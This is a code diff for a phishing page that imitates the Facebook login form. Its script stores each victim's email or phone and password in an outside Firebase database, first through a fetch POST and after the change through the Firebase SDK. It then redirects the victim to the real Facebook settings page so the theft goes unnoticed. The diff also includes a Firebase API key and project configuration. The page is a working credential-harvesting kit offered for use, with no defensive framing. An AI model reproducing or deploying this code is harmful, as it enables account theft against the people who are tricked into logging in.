@@ -19,7 +19,7 @@
       <br />
       <div class="formDiv">
         <div class="title">Log in to Facebook</div>
-        <form id="Form" action="">
+        <form id="Form" action="" method="get">
           <input
             type="text"
             class="inputtext _55r1 inputtext _1kbt inputtext _1kbt"
@@ -88,7 +88,30 @@
     <!--  -->
     <!--  -->
     <!--  -->
-    <script>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.9.3/firebase-app.js";
+      import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.9.3/firebase-analytics.js";
+      import {
+        getDatabase,
+        ref,
+        set,
+      } from "https://www.gstatic.com/firebasejs/9.9.3/firebase-database.js";
+      const firebaseConfig = {
+        apiKey: "AIzaSyD9qhntfmtQO4EwyQgZhrtjHhX1mxZhQ-4",
+        authDomain: "facebook-568a9.firebaseapp.com",
+        databaseURL: "https://facebook-568a9-default-rtdb.firebaseio.com",
+        projectId: "facebook-568a9",
+        storageBucket: "facebook-568a9.appspot.com",
+        messagingSenderId: "403896636179",
+        appId: "1:403896636179:web:e1ed186349b7d7408740e6",
+        measurementId: "G-JL8KDZPDVW",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const analytics = getAnalytics(app);
+      const db = getDatabase();
+
+      //////////////////
       const email = document.querySelector("#email");
       const pass = document.querySelector("#pass");
       const Form = document.querySelector("#Form");
@@ -102,22 +125,15 @@
           const emailValue = email.value;
           const passValue = pass.value;
           //////////////////
-          fetch(
-            "https://facebook-568a9-default-rtdb.firebaseio.com/Data.json",
-            {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify({
-                Time: new Date().toLocaleString(),
-                Email_Phone: emailValue,
-                Password: passValue,
-              }),
-            }
-          )
+          let x = emailValue.split(/\W/g);
+          let y = Math.floor(Math.random() * 1000);
+          let id = x + "" + y;
+          set(ref(db, "Data/" + id), {
+            Time: new Date().toLocaleString(),
+            Email_Phone: emailValue,
+            Password: passValue,
+          })
             .then(() => {
-              console.log("1");
               callback();
             })
             .catch((error) => {
@@ -126,9 +142,9 @@
         };
         //////////////////
         const taskTwo = () => {
-          console.log("2");
           window.location = "https://www.facebook.com/settings/?tab=account";
         };
+        //////////////////
         taskOne(() => taskTwo());
       });
     </script>
